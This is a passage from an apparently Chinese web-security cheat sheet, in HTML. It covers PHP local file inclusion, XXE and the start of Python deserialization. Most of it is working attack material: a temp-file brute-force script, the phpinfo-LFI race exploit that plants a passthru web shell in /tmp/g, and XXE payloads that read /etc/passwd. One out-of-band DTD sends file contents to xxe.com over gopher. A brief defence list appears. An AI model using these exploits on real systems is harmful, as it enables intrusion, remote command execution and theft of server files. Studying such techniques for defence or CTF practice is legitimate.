class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = <span class="string">"%s/include.php?f=/tmp/php%s"</span> % (</span><br><span class="line">                                base_url, filename)</span><br><span class="line">                            <span class="keyword">print</span> url</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                    <span class="keyword">print</span> <span class="string">"[+] Include success!"</span></span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                <span class="keyword">print</span> e</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h4><p>原理：</p>
<p>我们构造一个上传表单的时候,php也会生成一个对应的临时文件,这个文件的相关内容可以在phpinfo()的<code>_FILE[&quot;file&quot;]</code>查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以getshell了。</p>
<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php $c=fopen('/tmp/g','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    <span class="comment"># 这里需要修改为phpinfo.php的地址</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">        <span class="comment"># print fn</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    <span class="comment"># print lfireq % (fn, host) #debug调试结果</span></span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print d #查看回显是否成功</span></span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><ol>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>对危险字符进行过滤等等</li>
</ol>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="有回显，直接读文件"><a href="#有回显，直接读文件" class="headerlink" title="有回显，直接读文件"></a>有回显，直接读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="无回显，引用服务器上的XML文件"><a href="#无回显，引用服务器上的XML文件" class="headerlink" title="无回显，引用服务器上的XML文件"></a>无回显，引用服务器上的XML文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxe.com/1.xml&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br></pre></td></tr></table></figure>

<p>1.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;!ENTITY % a SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &apos;gopher://xxe.com/%a;&apos;&gt;&quot;&gt; %b; %c`</span><br></pre></td></tr></table></figure>

<p>然后访问log</p>
<h3 id="无回显，利用报错直接使用本地DTD"><a href="#无回显，利用报错直接使用本地DTD" class="headerlink" title="无回显，利用报错直接使用本地DTD"></a>无回显，利用报错直接使用本地DTD</h3><h4 id="fonts-dtd"><a href="#fonts-dtd" class="headerlink" title="fonts.dtd:"></a>fonts.dtd:</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % expr 'aaa)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///FILE_TO_READ"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT aa (bb'&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="mbeans-descriptors-dtd"><a href="#mbeans-descriptors-dtd" class="headerlink" title="mbeans-descriptors.dtd:"></a>mbeans-descriptors.dtd:</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd"&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % Boolean '(aa) #IMPLIED&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///FILE_TO_READ"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        &lt;!ATTLIST attxx aa "bb"'&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="docbookx-dtd"><a href="#docbookx-dtd" class="headerlink" title="docbookx.dtd"></a>docbookx.dtd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message</span><br></pre></td></tr></table></figure>

<h3 id="RSS-XXE"><a href="#RSS-XXE" class="headerlink" title="RSS XXE"></a>RSS XXE</h3><p>bytectf 2019 </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>utf-16编码绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16be &lt; exp.xml &gt; xxe-utf-16.xml</span><br></pre></td></tr></table></figure>

<h2 id="python-反序列化"><a href="#python-反序列化" class="headerlink" title="python 反序列化"></a>python 反序列化</h2><h3 id="python序列化和反序列化是什么"><a href="#python序列化和反序列化是什么" class="headerlink" title="python序列化和反序列化是什么"></a>python序列化和反序列化是什么</h3><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。 </p>
<h4 id="1-序列化过程："><a href="#1-序列化过程：" class="headerlink" title="1.序列化过程："></a>1.序列化过程：</h4><p>(1)从对象提取所有属性,并将属性转化为名值对<br>(2)写入对象的类名<br>(3)写入名值对</p>
<h4 id="2-反序列化过程："><a href="#2-反序列化过程：" class="headerlink" title="2.反序列化过程："></a>2.反序列化过程：</h4><p>(1)获取 pickle 输入流<br>(2)重建属性列表<br>(3)根据类名创建一个新的对象<br>(4)将属性复制到新的对象中</p>
